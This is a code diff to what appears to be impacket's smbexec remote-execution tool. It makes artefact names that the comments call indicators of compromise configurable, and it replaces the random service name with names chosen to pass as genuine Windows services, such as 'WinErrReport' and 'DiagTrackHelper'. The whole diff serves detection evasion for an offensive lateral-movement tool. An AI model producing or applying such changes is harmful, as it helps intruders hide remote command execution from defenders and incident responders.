@@ -56,10 +56,35 @@ from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
-OUTPUT_FILENAME = '__output_' + ''.join([random.choice(string.ascii_letters) for i in range(8)])
-SMBSERVER_DIR   = '__tmp'
-DUMMY_SHARE     = 'TMP'
+# Output/scratch artefact names. The '__output_' and '__tmp' double-underscore
+# prefixes and the 'TMP' dummy share are distinctive smbexec IOCs; override via
+# env without code changes (the random suffix on the output file is kept).
+#   IMPACKET_OUTPUT_PREFIX  - prefix of the per-command output file (default '__output_')
+#   IMPACKET_SMBSERVER_DIR  - local scratch dir for SERVER mode    (default '__tmp')
+#   IMPACKET_DUMMY_SHARE    - share name the local smbserver exposes (default 'TMP')
+OUTPUT_PREFIX   = os.environ.get('IMPACKET_OUTPUT_PREFIX', '__output_')
+OUTPUT_FILENAME = OUTPUT_PREFIX + ''.join([random.choice(string.ascii_letters) for i in range(8)])
+SMBSERVER_DIR   = os.environ.get('IMPACKET_SMBSERVER_DIR', '__tmp')
+DUMMY_SHARE     = os.environ.get('IMPACKET_DUMMY_SHARE', 'TMP')
 CODEC = sys.stdout.encoding
+
+# smbexec creates a service to run each command; the historic default name was a
+# random 8-char alpha string, which is itself an IOC. Pick a plausible name
+# instead. Honours the same env contract as serviceinstall.py so an operator sets
+# it once for the whole toolkit:
+#   IMPACKET_SERVICE_NAME       - pin one exact service name
+#   IMPACKET_SERVICE_NAME_POOL  - comma-separated pool to pick from
+_DEFAULT_SERVICE_POOL = ['WinErrReport', 'NetProfMgr', 'TrustedHostSvc', 'WdiServiceHost',
+                         'AppReadinessSvc', 'DiagTrackHelper', 'SysMainHelper', 'UsoSvcHost']
+
+
+def _benign_service_name():
+    name = os.environ.get('IMPACKET_SERVICE_NAME')
+    if name:
+        return name
+    raw = os.environ.get('IMPACKET_SERVICE_NAME_POOL')
+    pool = [x.strip() for x in raw.split(',') if x.strip()] if raw else _DEFAULT_SERVICE_POOL
+    return random.choice(pool or _DEFAULT_SERVICE_POOL)
 
 class SMBServer(Thread):
     def __init__(self):
@@ -136,7 +161,7 @@ class CMDEXEC:
             self.__lmhash, self.__nthash = hashes.split(':')
 
         if serviceName is None:
-            self.__serviceName = ''.join([random.choice(string.ascii_letters) for i in range(8)])
+            self.__serviceName = _benign_service_name()
         else:
             self.__serviceName = serviceName
 
